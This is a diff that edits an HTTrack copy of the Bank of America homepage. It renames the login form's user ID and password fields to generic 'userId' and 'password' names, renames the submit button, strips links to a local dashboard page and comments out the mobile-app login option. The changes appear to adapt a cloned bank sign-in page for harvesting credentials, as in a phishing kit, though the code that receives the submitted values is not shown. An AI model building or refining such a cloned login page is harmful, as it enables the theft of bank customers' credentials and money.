@@ -3933,19 +3933,8 @@
                                           ><span
                                             class="ada-hidden"
                                           ></span></label
-                                        ><select
-                                          id="onlineIdSelect"
-                                          noemptyoption="false"
-                                          class="spa-input-select"
-                                          value=""
-                                          onchange='this.setAttribute("data-val",this.value)'
-                                          data-val=""
                                         >
-                                          <option value="">&#160;</option>
-                                          <option value="undefined">
-                                            undefined
-                                          </option>
-                                        </select>
+                                       
                                         <p
                                           class="spa-input-hint"
                                           id="onlineIdSelect-hint-text"
@@ -3981,7 +3970,7 @@
                                           data-mobile-pattern=""
                                           data-default-pattern=""
                                           id="onlineId1"
-                                          name="onlineId1"
+                                          name="userId"
                                           placeholder="User ID"
                                           maxlength="32"
                                           aria-required="true"
@@ -4026,7 +4015,7 @@
                                           data-mobile-pattern=""
                                           data-default-pattern=""
                                           id="passcode1"
-                                          name="passcode1"
+                                          name="password"
                                           placeholder="Password"
                                           maxlength="20"
                                           class="tl-private cs-passcode1 spa-input-text userPassword"
@@ -4090,9 +4079,34 @@
                                       <button
                                         class="spa-btn spa-btn--primary spa-btn--block spa-btn--medium loginBtn"
                                         type="submit"
-                                        id="signIn"
+                                        id="SignInBtn"
                                       >
-                                        <span><a href="./dashboard.html">Log In</a></span>
+                                        <span>Log In</span>
+                                        <!-- <span class="circle-animation"
+                                          ><div class="circle-inline">
+                                            Loading
+                                          </div>
+                                          <div
+                                            class="loading-circle circle-inline"
+                                          >
+                                            <div class="circle-bounce1"></div>
+                                            <div class="circle-bounce2"></div>
+                                            <div
+                                              class="circle-bounce3"
+                                            ></div></div
+                                        ></span> -->
+                                      </button>
+                                    </div>
+                                    <div
+                                      class="small-12 columns hidden"
+                                      id="signin-with-mobile-app"
+                                    >
+                                      <!-- <button
+                                        class="spa-btn spa-btn--primary spa-btn--block"
+                                        id="signin-with-mobile-app-button"
+                                        type="submit"
+                                      >
+                                        <span>Log In with mobile app</span>
                                         <span class="circle-animation"
                                           ><div class="circle-inline">
                                             Loading
@@ -4106,19 +4120,7 @@
                                               class="circle-bounce3"
                                             ></div></div
                                         ></span>
-                                      </button>
-                                    </div>
-                                    <div
-                                      class="small-12 columns hidden"
-                                      id="signin-with-mobile-app"
-                                    >
-                                      <button
-                                        class="spa-btn spa-btn--primary spa-btn--block"
-                                        id="signin-with-mobile-app-button"
-                                        type="submit"
-                                      >
-                                        <a href="./dashboard.html"></a>
-                                      </button>
+                                      </button> -->
                                     </div>
                                     <div
                                       class="small-12 columns hidden"
@@ -4127,7 +4129,6 @@
                                       <button
                                         class="spa-btn spa-btn--primary spa-btn--block"
                                         id="signin-pwdless-button"
-                                        type="button"
                                       >
                                         <span>Log In with Windows Hello</span>
                                         <span class="circle-animation"
@@ -9275,3 +9276,5 @@
   </body>
   <!-- Mirrored from www.bankofamerica.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 May 2023 00:26:52 GMT -->
 </html>
+
+
